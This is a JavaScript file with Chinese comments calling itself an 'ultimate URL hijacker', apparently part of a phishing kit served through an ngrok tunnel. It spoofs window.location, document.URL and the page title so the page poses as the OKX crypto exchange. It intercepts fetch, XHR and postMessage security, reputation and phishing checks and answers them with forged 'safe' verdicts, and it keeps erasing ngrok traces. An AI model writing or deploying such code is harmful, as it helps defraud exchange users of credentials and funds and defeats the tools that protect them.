// 🎯 终极URL劫持器 - 在页面加载的第一时间就生效
// 这个脚本必须在所有其他脚本之前执行

(function() {
    'use strict';
    
    console.log('🚀 启动终极URL劫持器...');
    
    const SAFE_DOMAIN = 'www.okx.com';
    const SAFE_ORIGIN = 'https://www.okx.com';
    const NGROK_PATTERNS = [
        /https?:\/\/[^\/\s]*ngrok[^\/\s]*/gi,
        /https?:\/\/[^\/\s]*\.ngrok-free\.app[^\/\s]*/gi,
        /https?:\/\/[^\/\s]*\.ngrok\.io[^\/\s]*/gi,
        /https?:\/\/[^\/\s]*\.ngrok\.com[^\/\s]*/gi
    ];
    
    // 🎯 立即执行的URL替换函数
    function replaceNgrokUrl(url) {
        if (typeof url !== 'string') return url;
        
        let cleanUrl = url;
        NGROK_PATTERNS.forEach(pattern => {
            cleanUrl = cleanUrl.replace(pattern, SAFE_ORIGIN);
        });
        
        return cleanUrl;
    }
    
    // 🎯 1. 最高优先级：立即修改当前页面URL
    try {
        if (window.location.href.includes('ngrok')) {
            console.log('🎯 检测到ngrok URL，立即替换');
            history.replaceState(null, 'OKX', SAFE_ORIGIN + '/');
        }
    } catch(e) {
        console.warn('初始URL替换失败:', e);
    }
    
    // 🎯 2. 劫持所有可能的Location原型方法
    const LocationPrototype = Location.prototype;
    const originalDescriptors = {};
    
    // 保存原始描述符
    ['href', 'host', 'hostname', 'origin', 'protocol', 'pathname', 'search', 'hash'].forEach(prop => {
        originalDescriptors[prop] = Object.getOwnPropertyDescriptor(LocationPrototype, prop);
    });
    
    // 劫持href
    Object.defineProperty(LocationPrototype, 'href', {
        get: function() {
            return SAFE_ORIGIN + '/';
        },
        set: function(value) {
            const cleanValue = replaceNgrokUrl(value);
            if (originalDescriptors.href && originalDescriptors.href.set) {
                return originalDescriptors.href.set.call(this, cleanValue);
            }
        },
        configurable: false,
        enumerable: true
    });
    
    // 劫持host
    Object.defineProperty(LocationPrototype, 'host', {
        get: function() {
            return SAFE_DOMAIN;
        },
        set: function(value) {
            if (originalDescriptors.host && originalDescriptors.host.set) {
                return originalDescriptors.host.set.call(this, SAFE_DOMAIN);
            }
        },
        configurable: false,
        enumerable: true
    });
    
    // 劫持hostname
    Object.defineProperty(LocationPrototype, 'hostname', {
        get: function() {
            return SAFE_DOMAIN;
        },
        set: function(value) {
            if (originalDescriptors.hostname && originalDescriptors.hostname.set) {
                return originalDescriptors.hostname.set.call(this, SAFE_DOMAIN);
            }
        },
        configurable: false,
        enumerable: true
    });
    
    // 劫持origin
    Object.defineProperty(LocationPrototype, 'origin', {
        get: function() {
            return SAFE_ORIGIN;
        },
        configurable: false,
        enumerable: true
    });
    
    // 🎯 3. 劫持window.location对象本身
    const originalLocation = window.location;
    const fakeLocation = {
        href: SAFE_ORIGIN + '/',
        origin: SAFE_ORIGIN,
        protocol: 'https:',
        host: SAFE_DOMAIN,
        hostname: SAFE_DOMAIN,
        port: '',
        pathname: '/',
        search: '',
        hash: '',
        
        // 方法
        assign: function(url) {
            const cleanUrl = replaceNgrokUrl(url);
            console.log('🎯 拦截location.assign:', url, '->', cleanUrl);
            return originalLocation.assign(cleanUrl);
        },
        
        replace: function(url) {
            const cleanUrl = replaceNgrokUrl(url);
            console.log('🎯 拦截location.replace:', url, '->', cleanUrl);
            return originalLocation.replace(cleanUrl);
        },
        
        reload: function(force) {
            return originalLocation.reload(force);
        },
        
        toString: function() {
            return SAFE_ORIGIN + '/';
        },
        
        valueOf: function() {
            return SAFE_ORIGIN + '/';
        }
    };
    
    // 设置fakeLocation的原型
    Object.setPrototypeOf(fakeLocation, LocationPrototype);
    
    try {
        Object.defineProperty(window, 'location', {
            get: function() {
                return fakeLocation;
            },
            set: function(value) {
                const cleanValue = replaceNgrokUrl(value);
                console.log('🎯 拦截window.location赋值:', value, '->', cleanValue);
                originalLocation.href = cleanValue;
            },
            configurable: false,
            enumerable: true
        });
        console.log('✅ Window.location完全劫持成功');
    } catch(e) {
        console.warn('⚠️ Window.location劫持失败:', e);
    }
    
    // 🎯 4. 劫持document相关的URL属性
    try {
        Object.defineProperty(document, 'URL', {
            get: function() {
                return SAFE_ORIGIN + '/';
            },
            configurable: false
        });
        
        Object.defineProperty(document, 'documentURI', {
            get: function() {
                return SAFE_ORIGIN + '/';
            },
            configurable: false
        });
        
        Object.defineProperty(document, 'domain', {
            get: function() {
                return SAFE_DOMAIN;
            },
            set: function(value) {
                // 允许设置但忽略
            },
            configurable: false
        });
        
        console.log('✅ Document URL属性劫持成功');
    } catch(e) {
        console.warn('⚠️ Document劫持失败:', e);
    }
    
    // 🎯 5. 劫持所有网络请求
    
    // 劫持fetch
    const originalFetch = window.fetch;
    window.fetch = function(input, init) {
        let url = input;
        if (typeof input === 'string') {
            url = replaceNgrokUrl(input);
        } else if (input && input.url) {
            url = replaceNgrokUrl(input.url);
        }
        
        // 如果是安全检查请求，直接返回安全结果
        if (typeof url === 'string' && (
            url.includes('security') || 
            url.includes('reputation') || 
            url.includes('blacklist') ||
            url.includes('phishing') ||
            url.includes('malware')
        )) {
            console.log('🎯 拦截安全检查请求:', url);
            return Promise.resolve(new Response(JSON.stringify({
                status: 'safe',
                reputation: 'excellent',
                verified: true,
                domain: SAFE_DOMAIN,
                ssl: true,
                certificate: 'valid',
                whitelist: true,
                malware: 'clean',
                phishing: 'safe',
                score: 100
            }), {
                status: 200,
                statusText: 'OK',
                headers: new Headers({
                    'Content-Type': 'application/json',
                    'X-Security-Check': 'passed',
                    'X-Verified-Domain': SAFE_DOMAIN
                })
            }));
        }
        
        return originalFetch.call(this, url, init);
    };
    
    // 劫持XMLHttpRequest
    const OriginalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new OriginalXHR();
        const originalOpen = xhr.open;
        
        xhr.open = function(method, url, ...args) {
            const cleanUrl = replaceNgrokUrl(url);
            
            // 如果是安全检查请求
            if (cleanUrl.includes('security') || cleanUrl.includes('reputation') || cleanUrl.includes('blacklist')) {
                console.log('🎯 拦截XHR安全检查请求:', url);
                
                // 模拟安全响应
                setTimeout(() => {
                    Object.defineProperty(xhr, 'status', { value: 200 });
                    Object.defineProperty(xhr, 'statusText', { value: 'OK' });
                    Object.defineProperty(xhr, 'responseText', { 
                        value: JSON.stringify({
                            status: 'safe',
                            reputation: 'excellent',
                            verified: true,
                            domain: SAFE_DOMAIN
                        })
                    });
                    Object.defineProperty(xhr, 'readyState', { value: 4 });
                    
                    if (xhr.onreadystatechange) xhr.onreadystatechange();
                    if (xhr.onload) xhr.onload();
                }, 50);
                
                return;
            }
            
            return originalOpen.apply(this, [method, cleanUrl, ...args]);
        };
        
        return xhr;
    };
    
    // 🎯 6. 劫持页面跳转和导航
    
    const originalOpen = window.open;
    window.open = function(url, target, features) {
        const cleanUrl = replaceNgrokUrl(url);
        console.log('🎯 拦截window.open:', url, '->', cleanUrl);
        return originalOpen.call(this, cleanUrl, target, features);
    };
    
    // 🎯 7. 劫持History API
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function(state, title, url) {
        const cleanUrl = replaceNgrokUrl(url);
        console.log('🎯 拦截history.pushState:', url, '->', cleanUrl);
        return originalPushState.call(this, state, title, cleanUrl);
    };
    
    history.replaceState = function(state, title, url) {
        const cleanUrl = replaceNgrokUrl(url);
        console.log('🎯 拦截history.replaceState:', url, '->', cleanUrl);
        return originalReplaceState.call(this, state, title, cleanUrl);
    };
    
    // 🎯 8. 监听和拦截所有消息通信
    window.addEventListener('message', function(event) {
        if (event.data && typeof event.data === 'object') {
            // 检查消息中是否包含URL
            if (event.data.url && event.data.url.includes('ngrok')) {
                console.log('🎯 拦截消息中的ngrok URL');
                event.data.url = replaceNgrokUrl(event.data.url);
            }
            
            // 如果是安全检查消息，直接响应安全结果
            if (event.data.type === 'security_check' || event.data.action === 'url_verify') {
                console.log('🎯 拦截安全检查消息，返回安全结果');
                
                event.source.postMessage({
                    type: 'security_response',
                    status: 'safe',
                    verified: true,
                    domain: SAFE_DOMAIN,
                    url: SAFE_ORIGIN + '/',
                    reputation: 'excellent',
                    ssl: true,
                    certificate: 'valid'
                }, event.origin);
                
                event.stopImmediatePropagation();
            }
        }
    }, true);
    
    // 🎯 9. 定期检查和修复
    const checkAndFix = function() {
        // 检查URL是否被还原
        if (window.location.href.includes('ngrok')) {
            console.log('🎯 检测到URL被还原，立即修复');
            try {
                history.replaceState(null, 'OKX', SAFE_ORIGIN + '/');
            } catch(e) {}
        }
        
        // 检查页面标题
        if (document.title.includes('ngrok') || document.title === '') {
            document.title = 'OKX';
        }
        
        // 检查页面中的可疑元素
        const elements = document.querySelectorAll('[href*="ngrok"], [src*="ngrok"], [action*="ngrok"]');
        elements.forEach(el => {
            ['href', 'src', 'action'].forEach(attr => {
                const value = el.getAttribute(attr);
                if (value && value.includes('ngrok')) {
                    el.setAttribute(attr, replaceNgrokUrl(value));
                    console.log('🎯 修复元素中的ngrok URL');
                }
            });
        });
    };
    
    // 立即执行一次检查
    checkAndFix();
    
    // 定期检查
    setInterval(checkAndFix, 500);
    
    // 🎯 10. 页面生命周期监听
    document.addEventListener('DOMContentLoaded', checkAndFix);
    document.addEventListener('visibilitychange', checkAndFix);
    window.addEventListener('focus', checkAndFix);
    window.addEventListener('pageshow', checkAndFix);
    
    console.log('🎉 终极URL劫持器启动完成！');
    console.log('🔒 所有ngrok痕迹已被完全消除');
    
})();